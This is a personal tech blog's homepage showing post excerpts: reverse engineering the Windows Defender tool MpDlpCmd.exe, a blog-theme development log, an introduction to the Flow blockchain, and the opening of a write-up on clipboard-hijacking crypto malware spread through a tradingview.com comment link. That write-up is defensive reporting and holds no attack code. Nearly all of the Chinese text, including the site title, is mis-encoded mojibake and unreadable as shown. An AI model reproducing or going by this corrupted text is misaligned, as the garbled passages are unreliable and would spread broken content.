<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼"><meta name="msapplication-TileImage" content="/images/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼"><meta property="og:url" content="http://oalieno.github.io/"><meta property="og:site_name" content="æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://oalieno.github.io/img/og_image.png"><meta property="article:author" content="oalieno"><meta property="article:tag" content="blog, security, programming, coding, life"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://oalieno.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://oalieno.github.io"},"headline":"æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼","image":["http://oalieno.github.io/img/og_image.png"],"author":{"@type":"Person","name":"oalieno"},"publisher":{"@type":"Organization","name":"æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼","logo":{"@type":"ImageObject","url":{"text":"æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼","img":"/images/logo.svg"}}},"description":""}</script><link rel="icon" href="/images/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&amp;family=Material+Icons&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=G-LYLB67MBLS" async></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
    
        gtag('config', 'G-LYLB67MBLS');</script><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }
          Array
              .from(document.querySelectorAll('.tab-content'))
              .forEach($tab => {
                  $tab.classList.add('is-hidden');
              });
          Array
              .from(document.querySelectorAll('.tabs li'))
              .forEach($tab => {
                  $tab.classList.remove('is-active');
              });
          const $activeTab = document.querySelector(location.hash);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
          const $tabMenu = document.querySelector(`a[href="${location.hash}"]`);
          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img nolazy src="/images/logo.svg" alt="æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼" height="28"><p>æ­æ¬¸åˆ©æ©çš„éƒ¨è½æ ¼</p></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">é¦–é </a><a class="navbar-item" href="/archives">æ–‡ç« </a><a class="navbar-item" href="/categories">åˆ†é¡</a><a class="navbar-item" href="/tags">æ¨™ç±¤</a><a class="navbar-item" href="/about">é—œæ–¼æˆ‘</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-10-31T16:00:00.000Z" title="11/1/2022, 12:00:00 AM">2022-11-01</time></span><i class="material-icons">schedule</i><span class="level-item">a minute</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/11/01/MpDlpCmd/">ã€Windows Securityã€‘MpDlpCmd.exe</a></h1><div class="content"><h2 id="MpDlpCmd-exe">MpDlpCmd.exe</h2>
<p>This executable is located under <code>C:\ProgramData\Microsoft\Windows Defender\Platform\v.vv.vvvv.v-v</code><br>
It seems to be related to Data Loss Prevention (DLP).</p>
<p>There is no manual anywhere. Only a short message <code>Usage: MpDlpCmd -&lt;Command&gt;</code><br>
I decided to open IDA Pro to do some reverse engineering.</p>
<p align="center"><img data-src="/images/MpDlpCmd-ida.png" class=" lazyload"  title="MpDlpCmd IDA reverse engineering"></p>
<p>From the decompiled code, we can clearly see that there are three parameters.</p>
<ul>
<li><code>-h / -?</code>: print usage</li>
<li><code>-ShowDlpDetailsDialog</code></li>
<li><code>-TestDlpDetailsDialog</code></li>
</ul>
<h2 id="ShowDlpDetailsDialog">-ShowDlpDetailsDialog</h2>
<p>With <code>-ShowDlpDetailsDialog</code>, there will be error message <code>MpDlpCmd: Failed with hr = 0x80004005.</code>.<br>
Not sure what is happening.</p>
<h2 id="TestDlpDetailsDialog">-TestDlpDetailsDialog</h2>
<p>With <code>-TestDlpDetailsDialog</code>, we can get below window.</p>
<p align="center"><img data-src="/images/MpDlpCmd-TestDlpDetailsDialog.png" class=" lazyload"  title="MpDlpCmd with parameter -TestDlpDetailsDialog"></p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/11/01/MpDlpCmd/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2022-03-29T16:00:00.000Z" title="3/30/2022, 12:00:00 AM">2022-03-30</time></span><i class="material-icons">schedule</i><span class="level-item">3 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E7%A8%8B%E5%BC%8F/">ç¨‹å¼</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/03/30/blog03/">ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x03</a></h1><div class="content"><h2 id="éƒ¨è½æ ¼è¦æ¢å¾©æ›´æ–°å•¦">éƒ¨è½æ ¼è¦æ¢å¾©æ›´æ–°å•¦</h2>
<p>è·é›¢ä¸Šæ¬¡æ›´æ–°ä¹Ÿéäº†ä¸€å¹´å¤šäº†ï¼ŒæœŸé–“ç‚ºäº†æ›´åŠ å®¢è£½åŒ–ä¸»é¡Œï¼Œé‚„æƒ³éè¦è‡ªå·±å¾é ­åˆ»éƒ¨è½æ ¼ï¼ŒçœŸæ˜¯å¤ªå¤©çœŸäº†å•Š<br>
æœ€å¾Œé‚„æ˜¯å›ä¾†ç”¨æ–°ç‰ˆçš„ icarus ä¸»é¡Œï¼ŒçœŸé¦™ã€‚<br>
ä¹‹å‰æ˜¯æŠŠ icarus ä¸»é¡Œè·Ÿéƒ¨è½æ ¼ç¶åœ¨åŒå€‹ repo ä¸€èµ·æ›´æ–°ï¼Œä½†é€™æ¨£ä¸å¥½ç®¡ç†ï¼Œæ‰€ä»¥ç¾åœ¨å°±ç›´æ¥ <a target="_blank" rel="noopener" href="https://github.com/oalieno/hexo-theme-icarus">fork ä¸€ä»½å‡ºä¾†ç¶­è­·</a>ï¼Œæ˜¯ç”¨æœ€ç‰ˆçš„ <code>5.0.0-rc.1</code>ï¼Œä¹‹å¾Œæœ‰æ–°ç‰ˆæœ¬å°±å† merge é€²ä¾†å°±å¥½äº†ã€‚æŠŠä¹‹å‰åšéå¾—ä¸€äº›æ”¹å‹•éƒ½æ•´åˆé€²ä¸»é¡Œäº†ï¼Œé‚„æ˜¯è‡ªå·±å®¢è£½åŒ–éå¾—æœ€å°å‘³å•Šã€‚<br>
ä¹‹å¾Œæœƒæ…¢æ…¢æŠŠä¹‹å‰çš„æ–‡ç« å†æ”¾å›ä¾†ï¼Œæ‡‰è©²è‡³å°‘ä¸€é€±ä¸€æ›´å§ï¼Œå¸Œæœ›xD</p>
<h2 id="icarus-å¤§æ”¹ç‰ˆ">icarus å¤§æ”¹ç‰ˆ</h2>
<p>æˆ‘ä¹‹å‰ç”¨çš„ icarus ç‰ˆæœ¬é‚„åœ¨å¯« <code>.ejs</code><br>
ç¾åœ¨å·²ç¶“åœ¨å¯« <code>.jsx</code> äº†<br>
ä¹‹å‰çš„éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒä¸Šçš„ç¨‹å¼ç¢¼æœ‰äº›å¯èƒ½éƒ½ä¸èƒ½ç›´æ¥å¥—ç”¨äº†<br>
ä¸éä¸ç”¨æ“”å¿ƒæˆ‘ç¾åœ¨å·²ç¶“æŠŠæˆ‘æ”¹çš„ç¨‹å¼ç¢¼æ¨åˆ° <a target="_blank" rel="noopener" href="https://github.com/oalieno/hexo-theme-icarus">é€™è£¡</a> äº†</p>
<h2 id="Excerpt">Excerpt</h2>
<p>æˆ‘ç™¼ç¾ icarus çš„ excerpt å¯ä»¥å¯«åœ¨æ–‡ç« å…§å®¹çš„é–‹é ­ï¼Œè€Œä¸ç”¨å¯«åœ¨ front matter<br>
ä¸­é–“åŠ ä¸€å€‹ <code>&lt;!-- more --&gt;</code> å’Œæ–‡ç« ä¸»é«”å€éš”<br>
åƒæ˜¯ä¸‹é¢é€™æ¨£ï¼Œæˆ–æ˜¯çœ‹<a target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-icarus/blob/site/source/_posts/en/Getting-Started.md?plain=1">é€™è£¡ç¯„ä¾‹</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hello, this is the excerpt</span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">This is the article</span><br></pre></td></tr></table></figure>
<p>é€™æ¨£ excerpt ä¹Ÿå¯ä»¥å¿«æ¨‚å¯« markdown<br>
åœ¨é¦–é ä¹Ÿåªæœƒé¡¯ç¤ºåˆ° <code>&lt;!-- more --&gt;</code> ä¹‹å‰çš„å…§å®¹<br>
ä½†æ˜¯é» Read More çš„æŒ‰éˆ•è·³é€²å»æ–‡ç« ä¹‹å¾Œï¼Œæœƒç™¼ç¾ excerpt å…¶å¯¦é‚„åœ¨<br>
åªæ˜¯é é¢æœƒæ²å‹•åˆ° <code>#more</code> é€™å€‹ hashtag ä¹Ÿå°±æ˜¯æ–‡ç« ä¸»é«”çš„é–‹é ­<br>
ä¸éé€™æ¨£æ„Ÿè¦ºåªæ˜¯ä¸€å€‹å·æ‡¶çš„ä½œæ³•ï¼Œä¸æ˜¯ä¸€å€‹å®Œç¾çš„ä½œæ³•</p>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2022/03/30/blog03/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2021-02-26T16:00:00.000Z" title="2/27/2021, 12:00:00 AM">2021-02-27</time></span><i class="material-icons">schedule</i><span class="level-item">10 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E5%8D%80%E5%A1%8A%E9%8D%8A/">å€å¡ŠéŠ</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/27/flow/">ã€é …ç›®ä»‹ç´¹ã€‘Flow ( Dapper Labs )</a></h1><div class="content"><p>é€™å€‹é …ç›®ç®—æ˜¯å¾ˆæ–°çš„é …ç›®ï¼Œå»å¹´çš„ 9/22 - 10/3 æ‰åœ¨ç¬¬ä¸€æ³¢ ICOï¼Œæ¯äººé™è³¼ 1000 USDCï¼Œç•¶æ™‚ ICO çš„åƒ¹æ ¼æ˜¯ä¸€é¡† FLOW è¦åƒ¹ 0.1 USDCï¼Œåˆ°ç¾åœ¨ä¹Ÿæ¼²äº† 200 å€äº†å§ï¼Œåªæ¨æ²’æœ‰è²·æ›´å¤šå•Š Orz ä¸éè¦é–å€‰ä¸€å¹´ï¼Œæ‰€ä»¥è¦åˆ°ä»Šå¹´åº•æ‰æ‹¿çš„å›ä¾†ï¼Œä½†æ˜¯å…‰æ˜¯ç”¢ç”Ÿçš„åˆ©æ¯å°±å·²ç¶“å›æœ¬å¥½å¹¾å€äº†xD<br>
å¥½äº†ï¼Œå»¢è©±ä¸å¤šèªªï¼Œä¸‹é¢ä¾†ä»‹ç´¹ä¸€ä¸‹ flow çš„ç‰¹é»ã€‚</p>
<h2 id="è³‡æº">è³‡æº</h2>
<p>é€™é‚Šå…ˆæ”¾å¹¾å€‹é€£çµï¼Œæœ‰èˆˆè¶£å…¥é–€çš„å¯ä»¥çœ‹ä¸€ä¸‹</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.onflow.org/primer">å®˜æ–¹å¯«çš„å…¥é–€æ–‡ç« </a></li>
<li><a target="_blank" rel="noopener" href="https://docs.onflow.org/">å®˜æ–¹çš„æ–‡æª”</a></li>
<li><a target="_blank" rel="noopener" href="https://joshuahannan.medium.com/taking-your-first-steps-with-cadence-19dde86bbd0">åœ‹å¤–å¤§ä½¬çš„å…¥å‘æŒ‡å—</a></li>
</ul>
<h2 id="ç‰¹é»">ç‰¹é»</h2>
<p>Flow æ˜¯å°ˆé–€ç‚ºæ‡‰ç”¨ç¨‹å¼ä»¥åŠéŠæˆ²æ‰€é–‹ç™¼çš„ä¸€æ¢æ–°çš„å€å¡ŠéŠ<br>
åœ¨éŠä¸Šé¢å¯ä»¥ç”¨ Cadence é€™å€‹ç¨‹å¼èªè¨€æ’°å¯« smart contractï¼Œå°æ¯”éš”å£æ£šçš„ Ethereum ç”¨ Solidity å¯« smart contract</p>
<h3 id="Cadence-é€™å€‹ç¨‹å¼èªè¨€æœ‰ä»€éº¼ç‰¹é»å‘¢">Cadence é€™å€‹ç¨‹å¼èªè¨€æœ‰ä»€éº¼ç‰¹é»å‘¢</h3>
<ul>
<li><strong>Resource-Oriented Programming</strong>
<ul>
<li>è½èªªæ˜¯åƒè€ƒ facebook çš„ Libra ç”¨çš„ Move èªè¨€</li>
<li>è·Ÿ Rust çš„ ownership å¾ˆåƒ</li>
<li>å¯ä»¥çœ‹çœ‹ä¸‹é¢å…©ç¯‡ papersï¼Œåœ¨è¬›æ€éº¼æ¨£è¨­è¨ˆä¸€å€‹é©åˆç”¨åœ¨ smart contract ä¸Šçš„èªè¨€
<ul>
<li><a target="_blank" rel="noopener" href="https://src.acm.org/binaries/content/assets/src/2018/michael-coblenz.pdf">Obsidian: A Safer Blockchain Programming Language</a></li>
<li><a target="_blank" rel="noopener" href="http://www.cs.cmu.edu/~balzers/publications/digital_contracts_as_session_types.pdf">Resource-Aware Session Types for Digital Contracts</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>Upgradable Smart Contract</strong>
<ul>
<li>å¤šäº†ä¸€å€‹ beta state å¯ä»¥è®“ä½ ç›¡æƒ…çš„ upgradeï¼Œåœ¨é€™å€‹éšæ®µï¼Œå¦‚æœä½¿ç”¨é€™è¦ç”¨å°±è¦è‡ªè¡Œæ‰¿æ“”é¢¨éšªå›‰ï¼Œè©±æ˜¯é€™æ¨£èªªçš„</li>
<li>ç­‰åˆ°éƒ½æ¸¬è©¦å®Œå¾Œï¼Œå°±å¯ä»¥æ­£å¼ release äº†ï¼Œä¹‹å¾Œå°±è·Ÿéš”å£æ£š Ethereum çš„ smart contract ä¸€æ¨£å°±ä¸èƒ½å†æ”¹ä»–äº†</li>
</ul>
</li>
<li><strong>Built-in Logging Support</strong>
<ul>
<li>åªæœƒåœ¨ transaction ä¸Šæ¨™è¨˜ä¸€å€‹è¨˜è™Ÿï¼Œä½ æƒ³è¦çœ‹ log å°±è‡ªå·±åœ¨é›¢ç·šåŸ·è¡Œä¸€æ¬¡å°±å¯ä»¥çœ‹åˆ°äº†ï¼Œä¸åƒéš”å£æ£š Ethereum æŠŠ log å„²å­˜åœ¨éŠä¸Šé¢</li>
<li>åœ¨ Cadence èªè¨€ä¸­å°±ç›´æ¥ <code>log(&quot;hi&quot;)</code> å°±å¯ä»¥å° log äº†ï¼Œä¸åƒéš”å£æ£š Ethereum é‚„è¦å…ˆå®šç¾© event å† emit</li>
</ul>
</li>
</ul>
<h3 id="Flow-é€™æ¢å€å¡ŠéŠæœ‰å“ªäº›ç‰¹é»å‘¢">Flow é€™æ¢å€å¡ŠéŠæœ‰å“ªäº›ç‰¹é»å‘¢</h3>
<ul>
<li><strong>å‚ç›´åˆ†å·¥ ( pipeline )</strong>ï¼ŒæŠŠå•é¡Œåˆ‡æˆå››ä»½ï¼ŒæŸç¨®å•é¡Œæœƒæœ‰ä¸€ç¨®å°ˆé–€çš„ç¯€é»è² è²¬è™•ç†
<ul>
<li>ä¸åƒéš”å£æ£š Ethereum å°‹æ±‚ sharding çš„è§£æ±ºæ–¹å¼ï¼Œç”¨å¹³è¡Œåˆ†å·¥æŠŠæ‰€æœ‰äº¤æ˜“åˆ‡æˆå¾ˆå¤šå­éŠï¼Œå¤šäº†å¾ˆå¤šå•é¡Œ</li>
<li>åˆ†ä¸‹é¢å››ç¨®å·¥ä½œ
<ul>
<li>Consensus Nodes    : å…±è­˜æ©Ÿåˆ¶åœ¨æ­¤ç™¼åŠŸï¼ŒFlow ä½¿ç”¨ HotStuff å…±è­˜æ©Ÿåˆ¶</li>
<li>Verification Nodes : æª¢æŸ¥æ­£ç¢ºæ€§ï¼Œå–ç· é•è¦è€…</li>
<li>Execution Nodes    : åŸ·è¡Œäº¤æ˜“é™„å¸¶çš„é‚£äº›è¨ˆç®—å·¥ä½œï¼Œä¹Ÿå°±æ˜¯ smart contract è£¡é¢çš„ç¨‹å¼</li>
<li>Collection Nodes   : è² è²¬åŒ…è£äº¤æ˜“å€‘è™•ç†äº›é›œäº‹ï¼Œå†ä¸Ÿçµ¦ Consensus Nodesï¼Œç”¨ä¾†ææ˜‡æ•´é«”å€å¡ŠéŠçš„æ•ˆç‡</li>
</ul>
</li>
<li>ç¸½è€Œè¨€ä¹‹
<ul>
<li>Consensus å’Œ Verification é€™å…©ç¨® Node æ˜¯å®‰å…¨å®ˆé–€å“¡è² è²¬è®“ Flow æ›´å®‰å…¨</li>
<li>Execution å’Œ Collection é€™å…©ç¨® Node æ˜¯ç˜‹ç‹‚æ©Ÿå™¨äººè² è²¬è®“ Flow æ›´æœ‰æ•ˆç‡è·‘å¾—æ›´å¿«</li>
</ul>
</li>
</ul>
</li>
<li>æ¯å€‹å¸³è™Ÿè£¡é¢éƒ½å¯ä»¥æœ‰å¤šå€‹ smart contractï¼Œä¸åƒéš”å£æ£š Ethereum çš„ smart contract å’Œ address æ˜¯ä¸€å°ä¸€çš„é—œä¿‚</li>
<li>å…§å»ºæ”¯æ´ <strong>multi-signature</strong>ï¼Œæ¯å€‹ key æœƒæœ‰ä¸€å€‹ weightï¼Œåªæœ‰ä½ æä¾›çš„ key å€‘çš„ weight åŠ èµ·ä¾†æœ‰ 1000 å°±å¯ä»¥åšäº‹æƒ…äº†</li>
<li>è½å®˜ç¶²ä»‹ç´¹æ˜¯èªªæœ‰<strong>å¸³è™Ÿæ¢å¾©æ©Ÿåˆ¶</strong>ï¼Œä¸æ¸…æ¥šç´°ç¯€</li>
<li>å¼·èª¿èªªä»–éµå®ˆäº†è³‡æ–™åº«ç³»çµ±çš„ ACID ( Atomic, Consistent, Isolated, and Durable ) åŸå‰‡ï¼Œå› ç‚ºæ ¹æœ¬ä¸Šå€å¡ŠéŠå°±æ˜¯ä¸€å€‹å»ä¸­å¿ƒåŒ–çš„è³‡æ–™åº«</li>
</ul>
<h2 id="å¦‚ä½•æˆç‚ºç¯€é»">å¦‚ä½•æˆç‚ºç¯€é»</h2>
<p><a target="_blank" rel="noopener" href="https://docs.onflow.org/node-operation/node-setup">å®˜æ–¹çš„æ–‡æª” - Setting Up a Flow Node</a></p>
<table>
<thead>
<tr>
<th>NODE TYPE</th>
<th>CPU</th>
<th>MEMORY</th>
<th>DISK</th>
</tr>
</thead>
<tbody>
<tr>
<td>Collection</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Consensus</td>
<td>2 coresv</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Execution</td>
<td>16 cores</td>
<td>128 GB</td>
<td>2 TB</td>
</tr>
<tr>
<td>Verification</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
<tr>
<td>Access</td>
<td>2 cores</td>
<td>16 GB</td>
<td>200 GB</td>
</tr>
</tbody>
</table>
<blockquote>
<p>Make sure you have a sufficiently fast connection; we recommend at least 1Gbps, and 5Gbps is better.</p>
</blockquote>
<p>ç¡¬é«”è¦æ±‚é‚„è¡Œï¼Œæˆ‘çš„æ¡Œæ©Ÿå¥½åƒé‚„èƒ½è·‘ï¼Œä½†æ˜¯é€™å€‹ç¶²é€Ÿè¦æ±‚æœ‰é»é«˜å•Š<br>
è€Œä¸”é‚„è¦å¡«<a target="_blank" rel="noopener" href="https://www.onflow.org/node-validators">è¡¨å–®</a>ç”³è«‹ï¼Œå¤ªä¸­å¿ƒåŒ–äº†å•Š<br>
ç„¶å¾Œ<a target="_blank" rel="noopener" href="https://docs.onflow.org/node-operation/node-roles">é€™è£¡</a>æœ‰å¯«æ¯ç¨® node è¦è·‘å¾—è©±è¦ stake å¤šå°‘é¡† flowï¼Œæœ€ä¾¿å®œä¹Ÿè‡³å°‘è¦ stake 135000 é¡† flowï¼Œä»¥ç›®å‰çš„åƒ¹æ ¼ä¾†çœ‹å¤§æ¦‚æ˜¯ 270 è¬ç¾é‡‘å§ï¼Œæˆ‘å»</p>
<h2 id="Flow-ç›®å‰çš„ä¸€äº›å•é¡Œ">Flow ç›®å‰çš„ä¸€äº›å•é¡Œ</h2>
<p>ç›®å‰ Flow é‚„åœ¨åˆæœŸéšæ®µï¼Œæœ‰äº›æ±è¥¿é‚„æ²’æå¥½<br>
ä¸‹é¢ä¸€äº›è³‡è¨Šæ˜¯æˆ‘åœ¨ discord ç¾¤çœ‹åˆ°çš„</p>
<blockquote>
<p>we still have a lot of things locked down in mainnet right now. The ability to create accounts is one of them. At this time only partnered wallets can create accounts. This will obviously be opened up in the future. At a minimum it wonâ€™t happen until fees are in place on mainnet.</p>
<ul>
<li>qvvg on discord</li>
</ul>
</blockquote>
<p>ä¸»ç¶²è·¯é‚„æ²’å¥½å•Šï¼Œä¸èƒ½éš¨æ„å‰µå¸³è™Ÿ<br>
éœ€è¦ä»–å€‘åˆä½œçš„å¤¥ä¼´åƒæ˜¯ blockto æ‰èƒ½å‰µï¼Œå¯ä»¥ç”¨ <a target="_blank" rel="noopener" href="https://port.onflow.org/">https://port.onflow.org/</a> é€™å€‹å‰µå¸³è™Ÿçš„æ¨£å­<br>
é‚„ä¸å¤ å»ä¸­å¿ƒåŒ–å•Š</p>
<blockquote>
<p>Flowâ€™s fee model is still under development, but will have transaction fees. The payer of a transaction can be separate from the authorizer, so dapps can easily pay for their users transactions. Flow keeps tx fees affordable and accessible for all.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>æ‰‹çºŒè²»çš„æ©Ÿåˆ¶ä¹Ÿé‚„æ²’å¼„å¥½å•Š</p>
<blockquote>
<p>Flow is an decentralized protocol being built in an open ecosystem - there is no formal roadmap but if youâ€™d like to see areas people are currently expending effort you can take a look at issues currently in the GitHub repo <a target="_blank" rel="noopener" href="https://github.com/onflow/flow/issues">https://github.com/onflow/flow/issues</a> and feel free to create or comment on issues for anything that you think should exist on Flow.</p>
<ul>
<li>Flow Assistant Bot on discord</li>
</ul>
</blockquote>
<p>æ²’æœ‰æ­£å¼çš„ roadmap</p>
<h2 id="Flow-çš„æ‡‰ç”¨">Flow çš„æ‡‰ç”¨</h2>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.nbatopshot.com/">NBA Top Shot</a>: NBA ä¸»é¡Œçš„ NFTï¼Œå¯ä»¥è®“ä½ æ”¶è—ä½ æœ€æ„›çš„çƒå“¡ï¼Œä»¥åŠä»–å€‘å¾—åˆ†çš„ç‰‡æ®µç­‰</li>
<li><a target="_blank" rel="noopener" href="https://viv3.com/">VIV3</a>: è²·è³£ NFT çš„å¹³å°</li>
<li><a target="_blank" rel="noopener" href="https://motogp-ignition.com/">MotoGPâ„¢ Ignition</a>: é¡ä¼¼ Ethereum ä¸Šçš„ <a target="_blank" rel="noopener" href="https://www.f1deltatime.com/">F1Â® Delta Time</a>ï¼ŒåŒä¸€æ‰¹é–‹ç™¼äººå“¡çš„æ¨£å­ï¼Œåªæ˜¯å¾ F1 è³½è»Šæ”¹æˆ MotoGP æ‘©æ‰˜è»Šï¼Œå¯ä»¥çµ„è£è‡ªå·±çš„è»Šè»Šç„¶å¾Œè·Ÿåˆ¥äººæ¯”è³½ï¼Œä¸‹å€‹æœˆ 3/26 é–‹è³£</li>
<li><a target="_blank" rel="noopener" href="https://www.cryptokitties.co/">CryptoKitties</a>: é‚„åœ¨è¨ˆç•«å¾ Ethereum é·ç§»åˆ° Flowï¼Œä¸çŸ¥é“æ˜¯å“ªæ™‚å€™</li>
</ul>
<h2 id="ç¸½çµ">ç¸½çµ</h2>
<p>Flow æå‡ºäº†å¾ˆå¤šæ–¹æ¡ˆä¾†æ”¹é€²å»ä¸­å¿ƒåŒ–æ‡‰ç”¨é¢è‡¨åˆ°çš„å•é¡Œï¼Œæ¥ä¸‹ä¾†å°±è¦éœå¾…æ™‚é–“çš„è€ƒé©—ï¼Œç­‰æ½®æ°´é€€äº†å°±çŸ¥é“ Flow æœ‰æ²’æœ‰ç©¿è¤²å­äº†</p>
<h2 id="Flow-to-the-Moon-ğŸš€"><strong>Flow to the Moon ğŸš€</strong></h2>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2021/02/27/flow/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-08-15T16:00:00.000Z" title="8/16/2020, 12:00:00 AM">2020-08-16</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/08/16/clipboard-hijack/">Clipboard hijacking cryptocurrency malware on tradingview.com</a></h1><div class="content"><p>æœ€è¿‘åœ¨ <a target="_blank" rel="noopener" href="http://tradingview.com">tradingview.com</a> ä¸Šé¢çœ‹åˆ°é€™ç¯‡ Idea <a target="_blank" rel="noopener" href="https://www.tradingview.com/chart/EOSUSDT/SDsMZhix-EOS-footprints-of-institutional-money/">EOS - footprints of institutional money</a>ï¼Œçœ‹èµ·ä¾†åƒæ˜¯æ­£å¸¸çš„åˆ†æè¶¨å‹¢èµ°å‘çš„ Ideaï¼Œä½†æ˜¯ä¸‹é¢ç•™è¨€æœ‰ä¸€å€‹é€£çµ <code>mycryptorush.com/signals</code>ï¼Œèªªæ˜¯å¯ä»¥å¾—åˆ°å…è²»çš„ bitcoin å’Œäº¤æ˜“è¶¨å‹¢è¨Šè™Ÿã€‚</p>
<p align="center"><img data-src="/images/clipboard-hijack-1.png" class=" lazyload"  title="tradingview idea"></p>
